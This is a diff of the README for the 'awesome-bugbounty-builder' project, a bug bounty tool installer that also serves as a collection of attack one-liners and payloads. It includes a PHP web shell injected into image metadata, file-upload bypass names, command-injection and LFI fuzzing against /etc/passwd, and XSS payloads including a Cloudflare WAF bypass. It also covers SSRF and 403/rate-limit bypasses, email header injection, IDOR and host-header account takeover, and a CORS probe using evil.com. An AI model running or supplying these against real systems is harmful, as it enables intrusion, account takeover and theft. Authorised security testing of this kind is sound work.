@@ -1,9 +1,19 @@
 # Awesome Bug Bounty Builder ¯\\_(ツ)_/¯
 
-[![contributions welcome](https://img.shields.io/badge/contributions-welcome-brightgreen.svg?style=flat)](https://github.com/0xJin/awesome-bugbounty-builder/issues)
+
+<div align="center">
+    
+<img src="https://img.shields.io/badge/contributions-welcome-brightgreen.svg?style=flat"/> <br/>
+
+<a href="https://github.com/0xJin/awesome-bugbounty-builder/network"><img alt="GitHub forks" src="https://img.shields.io/github/forks/0xJin/awesome-bugbounty-builder"></a>
+<a href="https://github.com/0xJin/awesome-bugbounty-builder/blob/main/LICENSE"><img alt="GitHub license" src="https://img.shields.io/github/license/0xJin/awesome-bugbounty-builder"></a>
+<a href="https://github.com/0xJin/awesome-bugbounty-builder/stargazers"><img alt="GitHub stars" src="https://img.shields.io/github/stars/0xJin/awesome-bugbounty-builder"></a>
 
 
-Awesome Bug bounty builder Project - ALL common Tools for find your Vulnerabilities.
+<p><i> Awesome Bug bounty builder Project - ALL common Tools for find your Vulnerabilities.</i></p>
+</div>
+
+
 
 **Tested on Debian.**
 
@@ -13,9 +23,9 @@ Awesome Bug bounty builder Project - ALL common Tools for find your Vulnerabilit
 
 ---
 
-### Installation
+## Installation:
 
-```
+```sh
 $ git clone https://github.com/0xJin/awesome-bugbounty-builder.git
 $ cd awesome-bugbounty-builder/
 $ chmod +x awesome-bugbounty-builder.sh
@@ -23,52 +33,50 @@ $ ./awesome-bugbounty-builder.sh
 ```
 
 
-### Which tools You will find here
+## Tools You will find here 
 
-```
-Amass 
-Sublister 
-Gauplus 
-HTTPX
-Gf + patterns 
-Kxss 
-Sqlmap 
-Commix 
-Tplmap 
-HYDRA 
-John the ripper 
-Evilwinrm 
-Arjun 
-Paramspider 
-NoSQLmap 
-NMAP 
-Nikto 
-FFUF 
-403-Bypass 
-Gobuster 
-Seclists 
-Hash-identifier 
-XSSMAP 
-Smuggler 
-SSRFmap 
-Gmapsapiscanner 
-Qsreplace 
-exiftool 
-XSRFProbe 
-XXE Exploiter
-Rush
-```
+- Amass 
+- Sublister 
+- Gauplus 
+- HTTPX
+- Gf + patterns 
+- Kxss 
+- Sqlmap 
+- Commix 
+- Tplmap 
+- HYDRA 
+- John the ripper 
+- Evilwinrm 
+- Arjun 
+- Paramspider 
+- NoSQLmap 
+- NMAP 
+- Nikto 
+- FFUF 
+- 403-Bypass 
+- Gobuster 
+- Seclists 
+- Hash-identifier 
+- XSSMAP 
+- Smuggler 
+- SSRFmap 
+- Gmapsapiscanner 
+- Qsreplace 
+- exiftool 
+- XSRFProbe 
+- XXE Exploiter
+- Rush
 
 
 ---
 
 
-### Bug Bounty TIPS and Usage of tools + One Liner TIPS
+ ## Bug Bounty TIPS and Usage of tools + One Liner TIPS :
 
 
-# ONE-LINER *RECON* for FUZZ XSS
+### ONE-LINER *RECON* for FUZZ XSS :
 
-```
+```sh
 $ amass enum -brute -passive -d example.com | httpx -silent -status-code | tee domain.txt
 $ cat domain.txt | gauplus -random-agent -t 200 | gf xss | kxss | tee domain2.txt
 ```
@@ -76,18 +84,18 @@ $ cat domain.txt | gauplus -random-agent -t 200 | gf xss | kxss | tee domain2.tx
 ---
 
 
-# FUZZ all SUBDOMAINS with *FUFF* ONE-LINER
+### FUZZ all SUBDOMAINS with *FUFF* ONE-LINER :
 
-```
+```sh
 $ amass enum -brute -passive -d http://example.com | sed 's#*.# #g' | httpx -silent -threads 10 | xargs -I@ sh -c 'ffuf -w wordlist.txt -u @/FUZZ -mc 200'
 ```
 
 ---
 
 
-# COMMAND Injection with *FUFF* ONE-LINER
+### COMMAND Injection with *FUFF* ONE-LINER :
 
-```
+```sh
 $ cat subdomains.txt | httpx -silent -status-code | gauplus -random-agent -t 200 | qsreplace “aaa%20%7C%7C%20id%3B%20x” > fuzzing.txt
 $ ffuf -ac -u FUZZ -w fuzzing.txt -replay-proxy 127.0.0.1:8080
 // search for ”uid” in burp proxy intercept 
@@ -98,9 +106,9 @@ $ ffuf -ac -u FUZZ -w fuzzing.txt -replay-proxy 127.0.0.1:8080
 ---
 
 
-# SQL Injection Tips
+### SQL Injection Tips :
 
-```
+```sh
 // **MASS SQL injection**
 $ amass enum -brute -passive -d example.com | httpx -silent -status-code | tee domain.txt
 $ cat domain.txt | gauplus -random-agent -t 200 | gf sqli | tee domain2.txt
@@ -117,9 +125,9 @@ $ sqlmap -u "http://redacted.com" --dbs --batch --random-agent --forms --ignore-
 ---
 
 
-# XSS + SQLi + CSTI/SSTI
+### XSS + SQLi + CSTI/SSTI
 
-```
+```sh
 Payload: '"><svg/onload=prompt(5);>{{7*7}}
 ```
 
@@ -127,9 +135,9 @@ Payload: '"><svg/onload=prompt(5);>{{7*7}}
 ---
 
 
-# EXIFTOOL + file UPLOAD Tips
+### EXIFTOOL + file UPLOAD Tips :
 
-```
+```sh
 $ exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg
 // File Upload bypass
 file.php%20
@@ -156,9 +164,9 @@ file.php%00.png%00.jpg
 ---
 
 
-# Open Redirect Tips ONE-LINER
+### Open Redirect Tips ONE-LINER :
 
-```
+```sh
 $ export LHOST="http://localhost"; gau $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'
 ```
 
@@ -166,9 +174,9 @@ $ export LHOST="http://localhost"; gau $1 | gf redirect | qsreplace "$LHOST" | x
 ---
 
 
-# LFI ONE-LINER
+### LFI ONE-LINER :
 
-```
+```sh
 $ gauplus -random-agent -t 200 http://redacted.com | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
 ```
 
@@ -176,9 +184,9 @@ $ gauplus -random-agent -t 200 http://redacted.com | gf lfi | qsreplace "/etc/pa
 ---
 
 
-# Best SSRF Bypass
+### Best SSRF Bypass :
 
-```
+```sh
 http://127.1/
 http://0000::1:80/
 http://[::]:80/
@@ -193,9 +201,9 @@ http://0177.00.00.01
 ---
 
 
-# Email Attacks 
+### Email Attacks :
 
-```
+```sh
 // **Header Injection**
 "%0d%0aContent-Length:%200%0d%0a%0d%0a"@example.com
 "recipient@test.com>\r\nRCPT TO:<victim+"@test.com
@@ -218,9 +226,9 @@ john.doe@[127.0.0.1]
 ---
 
 
-# XSS Payload for Image
+### XSS Payload for Image
 
-```
+```sh
 <img src=x onerror=alert('XSS')>.png
 "><img src=x onerror=alert('XSS')>.png
 "><svg onmouseover=alert(1)>.svg
@@ -231,9 +239,9 @@ john.doe@[127.0.0.1]
 ---
 
 
-# My XSS for bypass CLOUDFLARE with default rules
+### My XSS for bypass CLOUDFLARE with default rules
 
-```
+```sh
 "/><svg+svg+svg\/\/On+OnLoAd=confirm(1)>
 ```
 
@@ -241,9 +249,9 @@ john.doe@[127.0.0.1]
 ---
 
 
-# Find hidden params in javascript files
+### Find hidden params in javascript files:
 
-```
+```sh
 $ amass enum -passive -brute -d redacted.com | gau | egrep -v '(.css|.svg)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'); echo -e "\e[1;33m$url\n\e[1;32m$vars"
 ```
 
@@ -251,9 +259,9 @@ $ amass enum -passive -brute -d redacted.com | gau | egrep -v '(.css|.svg)' | wh
 ---
 
 
-# IDOR to Account TakeOver quickly
+### IDOR to Account TakeOver quickly :
 
-```
+```sh
 ~Create an account 
 ~In the reset field set a password and intercept with burp
 ~GET /user/2099/reset (change to 2098) send the request
@@ -266,16 +274,16 @@ $ amass enum -passive -brute -d redacted.com | gau | egrep -v '(.css|.svg)' | wh
 ---
 
 
-# For API-KEYS 
+### For API-KEYS :
 
-```
+```sh
 $ use gauplus and paramspider , after you can grep words like "api" or "key" and use gmapsapiscanner for see if is vulnerable.
 ```
 
 
-# Find sensitive information with GF tool
+### Find sensitive information with GF tool :
 
-```
+```sh
 $ gauplus redacted.com -subs | cut -d"?" -f1 | grep -E "\.js+(?:on|)$" | tee domains.txt
 sort -u domains.txt | fff -s 200 -o out/
 $ for i in `gf -list`; do [[ ${i} =~ "_secrets"* ]] && gf ${i}; done
@@ -285,9 +293,9 @@ $ for i in `gf -list`; do [[ ${i} =~ "_secrets"* ]] && gf ${i}; done
 ---
 
 
-# Bypass RATE-LIMIT by adding
+### Bypass RATE-LIMIT by adding :
 
-```
+```sh
 X-Originating-IP: IP
 X-Forwarded-For: IP
 X-Remote-IP: IP
@@ -301,9 +309,9 @@ X-Forwared-Host: IP
 ---
 
 
-# Find Access Token with FFUF and GAUPLUS
+### Find Access Token with FFUF and GAUPLUS :
 
-```
+```sh
 $ cat domains.txt | sed 's/https\?:\/\///' | gau > domains2.txt
 $ cat domains2.txt | grep -P "\w+\.js(\?|$)" | sort -u > jsurls.txt
 $ ffuf -mc 200 w jsurls.txt:HFUZZ -u HFUZZ -replay-proxy http://127.0.0.1:8080
@@ -315,9 +323,9 @@ $ ffuf -mc 200 w jsurls.txt:HFUZZ -u HFUZZ -replay-proxy http://127.0.0.1:8080
 ---
 
 
-# Find CORS vulnerabilities
+### Find CORS vulnerabilities :
 
-```
+```sh
 $ amass enum -d redacted.com | httpx -threads 300 -follow-redirects -silent | rush -j200 'curl -m5 -s -I -H "Origin: evil.com" {} | [[ $(grep -c "evil.com") -gt 0 ]] && printf "\n3[0;32m[VUL TO CORS] 3[0m{}"' 2>/dev/null
 ```
 
@@ -325,7 +333,7 @@ $ amass enum -d redacted.com | httpx -threads 300 -follow-redirects -silent | ru
 ---
 
 
-# Bypass 403 and 401
+### Bypass 403 and 401 :
 
 ```
 X-Original-URL: /admin
@@ -337,7 +345,7 @@ X-Rewrite-URL: /admin
 ---
 
 
-# Password poisoning bypass to account takeover
+### Password poisoning bypass to account takeover :
 
 ```
 // Request
@@ -351,7 +359,7 @@ Host: evil.com
 ---
 
 
-# Best Wordlists
+### Best Wordlists :
 
 ```
 https://github.com/six2dez/OneListForAll/releases
@@ -361,6 +369,8 @@ https://github.com/Karanxa/Bug-Bounty-Wordlists
 
 ---
 
-### Thanks Follow me on Twitter
+## Thanks 
 
-[@0xJin](https://twitter.com/0xJin) - This tool is made from 0xJin ¯\\_(ツ)_/¯
+Don't forget to follow me on Twitter.
+
+[@0xJin](https://twitter.com/0xJin) - This tool is made with ❤️ by 0xJin ¯\\_(ツ)_/¯.
